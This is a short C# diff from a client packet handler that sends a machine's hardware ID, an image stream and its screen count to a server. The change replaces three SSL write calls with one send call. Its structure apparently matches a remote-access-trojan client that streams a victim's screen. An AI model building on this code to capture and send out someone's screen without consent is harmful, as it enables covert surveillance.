@@ -76,9 +76,7 @@ namespace Client.Handle_Packet
                             msgpack.ForcePathObject("ID").AsString = hwid;
                             msgpack.ForcePathObject("Stream").SetAsBytes(stream.ToArray());
                             msgpack.ForcePathObject("Screens").AsInteger = Convert.ToInt32(System.Windows.Forms.Screen.AllScreens.Length);
-                            tempSocket.SslClient.Write(BitConverter.GetBytes(msgpack.Encode2Bytes().Length));
-                            tempSocket.SslClient.Write(msgpack.Encode2Bytes());
-                            tempSocket.SslClient.Flush();
+                            tempSocket.Send(msgpack.Encode2Bytes());
                             Thread.Sleep(1);
                         }
                     }
